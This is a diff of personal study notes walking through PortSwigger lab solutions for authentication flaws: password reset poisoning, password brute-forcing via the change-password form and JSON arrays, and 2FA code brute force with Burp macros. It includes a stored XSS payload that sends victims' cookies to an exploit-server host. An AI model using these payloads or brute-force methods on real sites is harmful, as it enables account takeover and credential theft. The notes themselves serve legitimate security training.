@@ -242,15 +242,16 @@ This lab stores the user's password hash in a cookie. The lab also contains an X
 1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
 2. In the **Proxy > HTTP history** tab, go to the **Response** to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows:
     `username+':'+md5HashOfPassword`
+
 3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
 4. Go to the exploit server and make a note of the URL.
 5. Go to one of the blogs and post a comment containing the following [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) payload, remembering to enter your own exploit server ID:
     `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
+    
 6. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
 7. Decode the cookie in Burp Decoder. The result will be:
     `carlos:26323c16d5f4dabff3bb136f2460a943`
 8. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`.
-9. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.
 
 # **10. Password reset poisoning via middleware**
 This lab is vulnerable to password reset poisoning. The user `carlos` will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server.
@@ -266,7 +267,7 @@ This lab is vulnerable to password reset poisoning. The user `carlos` will car
 8. Load this URL and set a new password for Carlos's account.
 
 Analysis:
-- capture the forgot password request in burp
+- capture forgot-password request in burp
 ![[Pasted image 20241021141937.png]]
 
 - adding `X-Forwarded-Host: external exploit server` to capture the new forgot password request with a new username: `carlos`
@@ -276,23 +277,87 @@ Analysis:
 - we will use our valid change password URL and swap token with the new one that we have generated for user `carlos`
 ![[Pasted image 20241021142519.png]]
 
-# **11. Offline password cracking**
-This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.
+# **11.  Password brute-force via password change**
+This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.
 
 - Your credentials: `wiener:peter`
 - Victim's username: `carlos`
+- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
 
-1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
-2. In the **Proxy > HTTP history** tab, go to the **Response** to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows:
-    `username+':'+md5HashOfPassword`
-3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
-4. Go to the exploit server and make a note of the URL.
-5. Go to one of the blogs and post a comment containing the following [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) payload, remembering to enter your own exploit server ID:
-    `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
-6. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
-7. Decode the cookie in Burp Decoder. The result will be:
-    `carlos:26323c16d5f4dabff3bb136f2460a943`
-8. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`.
+1. With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request.
+2. Notice the behavior when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states `Current password is incorrect`. If you enter a valid current password, but two different new passwords, the message says `New passwords do not match`. We can use this message to enumerate correct passwords.
+3. Enter your correct current password and two new passwords that do not match. Send this `POST /my-account/change-password` request to Burp Intruder.
+4. In Burp Intruder, change the `username` parameter to `carlos` and add a payload position to the `current-password` parameter. Make sure that the new password parameters are set to two different values. For example:
+    `username=carlos&current-password=§incorrect-password§&new-password-1=123&new-password-2=abc`
+5. In the **Payloads** side panel, enter the list of passwords as the payload set.
+6. Click  **Settings** to open the **Settings** side panel, then add a grep match rule to flag responses containing `New passwords do not match`. Start the attack.
+7. When the attack finished, notice that one response was found that contains the `New passwords do not match` message. Make a note of this password.
+8. In the browser, log out of your own account and lock back in with the username `carlos` and the password that you just identified.
 
 Analysis:
+- wrong password, newpassword1 **=** newpassword2 (lock account - log out);
+- wrong password, newpassword1 **!=** newpassword2 (message: current password do not match);
 
+- correct password, newpassword1 **=** newpassword2 (changing current password);
+- correct password, newpassword1 **!=** newpassword2 (message: new passwords do not match);
+
+![[Pasted image 20241021155151.png]]
+
+![[Pasted image 20241021155339.png]]
+	![[Pasted image 20241021155608.png]]
+![[Pasted image 20241021155818.png]]
+
+# **12. Broken brute-force protection, multiple credentials per request**
+This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.
+
+- Victim's username: `carlos`
+- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)
+
+1. With Burp running, investigate the login page. Notice that the `POST /login` request submits the login credentials in `JSON` format. Send this request to Burp Repeater.
+2. In Burp Repeater, replace the single string value of the password with an array of strings containing all of the candidate passwords. For example:
+    
+    `"username" : "carlos", "password" : [ "123456", "password", "qwerty" ... ]`
+3. Send the request. This will return a 302 response.
+4. Right-click on this request and select **Show response in browser**. Copy the URL and load it in the browser. The page loads and you are logged in as `carlos`.
+5. Click **My account** to access Carlos's account page and solve the lab.
+
+Analysis:
+![[Pasted image 20241021160340.png]]
+![[Pasted image 20241021160445.png]]
+	![[Pasted image 20241021160537.png]]
+
+# **13. 2FA bypass using a brute-force attack**
+This lab's two-factor authentication is vulnerable to brute-forcing. You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. To solve the lab, brute-force the 2FA code and access Carlos's account page.
+
+Victim's credentials: `carlos:montoya`
+#### Note:
+As the verification code will reset while you're running your attack, you may need to repeat this attack several times before you succeed. This is because the new code may be a number that your current Intruder attack has already attempted.
+
+1. With Burp running, log in as `carlos` and investigate the 2FA verification process. Notice that if you enter the wrong code twice, you will be logged out again. You need to use Burp's session handling features to log back in automatically before sending each request.
+2. In Burp, click  **Settings** to open the **Settings** dialog, then click **Sessions**. In the **Session Handling Rules** panel, click **Add**. The **Session handling rule editor** dialog opens.
+3. In the dialog, go to the **Scope** tab. Under **URL Scope**, select the option **Include all URLs**.
+4. Go back to the **Details** tab and under **Rule Actions**, click **Add > Run a macro**.
+5. Under **Select macro** click **Add** to open the **Macro Recorder**. Select the following 3 requests:
+    `GET /login POST /login GET /login2`
+6. Click **Test macro** and check that the final response contains the page asking you to provide the 4-digit security code. This confirms that the macro is working correctly.
+8. Send the `POST /login2` request to Burp Intruder.
+9. In Burp Intruder, add a payload position to the `mfa-code` parameter. In the **Payloads** side panel, select the **Numbers** payload type. Enter the range 0 - 9999 and set the step to 1. Set the min/max integer digits to 4 and max fraction digits to 0. This will create a payload for every possible 4-digit integer.
+11. Click on  **Resource pool** to open the **Resource pool** side panel. Add the attack to a resource pool with the **Maximum concurrent requests** set to `1`.
+12. Start the attack. Eventually, one of the requests will return a `302` status code. Right-click on this request and select **Show response in browser**. Copy the URL and load it in the browser.
+
+Analysis:
+- in a real word scenario, this technique will not work thus the 2FA will not be a static code (the refresh rate is under 30 sec --> not enough time to brute force the 4 digits code)
+------------------------------------------------------------------------
+- If you enter the wrong 2FA code **twice**, the application logs you out. This is a security mechanism we need to work around.
+- To overcome this, we’ll use **Burp's session handling rules** to automatically log back in after each failed 2FA attempt.
+- In the **Resource Pool** tab, create a new resource pool and set **Maximum concurrent requests** to `1`.
+- This ensures that the requests are sent one at a time, allowing Burp's session handling macro to re-login after every two failed attempts.
+
+- #####  **Adding a Session Handling Rule:**
+	 **Create a new rule**: In the Session Handling Rules panel, click **Add**. In the **Scope** tab, select **Include all URLs** to ensure the rule applies to all requests related to the target.
+
+- ##### **Creating a Macro to Re-Log in Automatically:**
+	Go to the **Details** tab in the Session Handling Rule Editor. Under **Rule Actions**, click **Add** > **Run a macro** and **Record the login sequence**:
+    - **GET /login**: Request to load the login page.
+    - **POST /login**: Request to submit Carlos's username and password.
+    - **GET /login2**: Request that loads the 2FA page after successful login.
